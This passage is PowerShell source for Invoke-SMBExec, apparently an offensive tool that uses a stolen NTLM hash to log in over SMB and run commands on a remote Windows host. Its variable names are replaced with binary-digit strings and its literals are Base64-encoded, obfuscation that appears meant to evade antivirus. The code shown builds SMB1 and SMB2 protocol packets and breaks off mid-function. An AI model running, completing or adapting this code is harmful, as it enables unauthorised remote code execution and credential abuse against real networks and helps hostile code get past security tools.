function Invoke-SMBExec
{
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)
if($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))) -and !$Target)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABUAGEAcgBnAGUAdAAgAGkAcwAgAHIAZQBxAHUAaQByAGUAZAAgAHcAaABlAG4AIABuAG8AdAAgAHUAcwBpAG4AZwAgAC0AUwBlAHMAcwBpAG8AbgA=')))
    throw
}
if($Command)
{
    ${10011100111101000} = $true
}
if($Version -eq '1')
{
    ${00110011011100110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA=')))
}
elseif($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAuADEA'))))
{
    ${00110011011100110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA')))
}
if($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaAA='))) -and $PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
{
    ${00111111001101100} = $true
}
function _01011001101010110
{
    param(${_10010000000101101})
    ForEach(${01110010010001001} in ${_10010000000101101}.Values)
    {
        ${10001011100110111} += ${01110010010001001}
    }
    return ${10001011100110111}
}
function _10100001110111101
{
    param([Int]${_10010101101011011},[Int]${_01101110010100110})
    [Byte[]]${_01111110111001110} = ([System.BitConverter]::GetBytes(${_10010101101011011} + ${_01101110010100110}))[2..0]
    ${00010110100001111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00010110100001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x00))
    ${00010110100001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${_01111110111001110})
    return ${00010110100001111}
}
function _10110010011100000
{
    param([Byte[]]$Command,[Byte[]]${_01111011000100011},[Byte[]]${_00000101111111001},[Byte[]]${_01101011100000111},[Byte[]]${_10010000100100001},[Byte[]]${_10110100100001101})
    ${_10010000100100001} = ${_10010000100100001}[0,1]
    ${00000100110010101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),[Byte[]](0xff,0x53,0x4d,0x42))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),$Command)
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbABhAHMAcwA='))),[Byte[]](0x00))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbwBkAGUA'))),[Byte[]](0x00,0x00))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_01111011000100011})
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA'))),${_00000101111111001})
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQASABpAGcAaAA='))),[Byte[]](0x00,0x00))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_01101011100000111})
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_10010000100100001})
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA'))),${_10110100100001101})
    ${00000100110010101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAHgASQBEAA=='))),[Byte[]](0x00,0x00))
    return ${00000100110010101}
}
function _10010011000010011
{
    param([String]$Version)
    if($Version -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
    {
        [Byte[]]${01011010101001001} = 0x0c,0x00
    }
    else
    {
        [Byte[]]${01011010101001001} = 0x22,0x00  
    }
    ${10111100001110110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x00))
    ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${01011010101001001})
    ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0AA=='))),[Byte[]](0x02))
    ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUA'))),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))
    if($version -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
    {
        ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADIA'))),[Byte[]](0x02))
        ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMgA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADMA'))),[Byte[]](0x02))
        ${10111100001110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMwA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }
    return ${10111100001110110}
}
function _01111000110101110
{
    param([Byte[]]${_00001011010101101})
    [Byte[]]${01011010101001001} = [System.BitConverter]::GetBytes(${_00001011010101101}.Length)[0,1]
    [Byte[]]${00110110011010000} = [System.BitConverter]::GetBytes(${_00001011010101101}.Length + 5)[0,1]
    ${01011101110110000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x0c))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATQBwAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0x02,0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBDAE4AdQBtAGIAZQByAA=='))),[Byte[]](0x01,0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBLAGUAeQA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAbABvAGIATABlAG4AZwB0AGgA'))),${01011010101001001})
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x44,0x00,0x00,0x80))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${00110110011010000})
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAbABvAGIA'))),${_00001011010101101})
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUATwBTAA=='))),[Byte[]](0x00,0x00,0x00))
    ${01011101110110000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUATABBAE4ATQBhAG4AYQBnAGUA'))),[Byte[]](0x00,0x00))
    return ${01011101110110000} 
}
function _01001100101001011
{
    param([Byte[]]${_00111001010111010})
    [Byte[]]${10000110101011000} = $([System.BitConverter]::GetBytes(${_00111001010111010}.Length + 7))[0,1]
    ${01101110100010010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x04))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x01,0x00))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${10000110101011000})
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))),[Byte[]](0x00))
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQA='))),${_00111001010111010})
    ${01101110100010010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))),[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))
    return ${01101110100010010}
}
function _10110100110011111
{
    param([Byte[]]${_10011111010111110})
    [Byte[]]${01101100000010001} = $([System.BitConverter]::GetBytes(${_10011111010111110}.Length))[0,1]
    [Byte[]]${10000011110001111} = $([System.BitConverter]::GetBytes(${_10011111010111110}.Length - 1))[0,1]
    ${00101100101111011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x18))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBOAGEAbQBlAEwAZQBuAA=='))),${10000011110001111})
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x16,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABGAEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG8AbgBTAGkAegBlAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA=='))),[Byte[]](0x07,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABvAHMAaQB0AGkAbwBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEYAbABhAGcAcwA='))),[Byte[]](0x00))
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${01101100000010001})
    ${00101100101111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBuAGEAbQBlAA=='))),${_10011111010111110})
    return ${00101100101111011}
}
function _10111100000001111
{
    ${01110011111101111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x0a))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEQA'))),[Byte[]](0x00,0x40))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQwBvAHUAbgB0AEwAbwB3AA=='))),[Byte[]](0x58,0x02))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AQwBvAHUAbgB0AA=='))),[Byte[]](0x58,0x02))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0xff,0xff,0xff,0xff))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcA'))),[Byte[]](0x00,0x00))
    ${01110011111101111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    return ${01110011111101111}
}
function _10001111011100101
{
    param([Byte[]]${_10100010101001100},[Int]${_01111110111001110})
    [Byte[]]${10111011011110110} = [System.BitConverter]::GetBytes(${_01111110111001110})[0,1]
    ${00010011111101001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x0e))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEQA'))),${_10100010101001100})
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0xea,0x03,0x00,0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0xff,0xff,0xff,0xff))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AbwBkAGUA'))),[Byte[]](0x08,0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcA'))),${10111011011110110})
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBMAGUAbgBnAHQAaABIAGkAZwBoAA=='))),[Byte[]](0x00,0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBMAGUAbgBnAHQAaABMAG8AdwA='))),${10111011011110110})
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x3f,0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00010011111101001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${10111011011110110})
    return ${00010011111101001}
}
function _10110100011010101
{
    param ([Byte[]]${_10100010101001100})
    ${00000000011110111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00000000011110111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x03))
    ${00000000011110111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEQA'))),${_10100010101001100})
    ${00000000011110111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUA'))),[Byte[]](0xff,0xff,0xff,0xff))
    ${00000000011110111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    return ${00000000011110111}
}
function _00010000100110000
{
    ${10011010000100011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10011010000100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x00))
    ${10011010000100011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    return ${10011010000100011}
}
function _10100001001000010
{
    ${01110100011001001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110100011001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x02))
    ${01110100011001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0xff))
    ${01110100011001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
    ${01110100011001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGQAWABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
    ${01110100011001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    return ${01110100011001001}
}
function _00110110101000101
{
    param([Byte[]]$Command,[Byte[]]${_10101010001001101},[Bool]${_10110011110101110},[Int]${_10100000001011110},[Byte[]]${_10010000100100001},[Byte[]]${_01101011100000111},[Byte[]]${_10110010110001001})
    if(${_10110011110101110})
    {
        ${_01111011000100011} = 0x08,0x00,0x00,0x00      
    }
    else
    {
        ${_01111011000100011} = 0x00,0x00,0x00,0x00
    }
    [Byte[]]${00101000011001000} = [System.BitConverter]::GetBytes(${_10100000001011110})
    if(${00101000011001000}.Length -eq 4)
    {
        ${00101000011001000} += 0x00,0x00,0x00,0x00
    }
    ${00100010000011100} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAEkARAA='))),[Byte[]](0xfe,0x53,0x4d,0x42))
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x40,0x00))
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAQwBoAGEAcgBnAGUA'))),[Byte[]](0x01,0x00))
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbABTAGUAcQB1AGUAbgBjAGUA'))),[Byte[]](0x00,0x00))
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),$Command)
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAUgBlAHEAdQBlAHMAdAA='))),${_10101010001001101})
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_01111011000100011})
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBJAEQA'))),${00101000011001000})
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_10010000100100001})
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_01101011100000111})
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAEQA'))),${_10110010110001001})
    ${00100010000011100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    return ${00100010000011100}
}
function _00111001001001110
{
    ${00100000000000110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x24,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdABDAG8AdQBuAHQA'))),[Byte[]](0x02,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x40,0x00,0x00,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGkAZQBuAHQARwBVAEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
    ${00100000000000110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAA='))),[Byte[]](0x02,0x02))
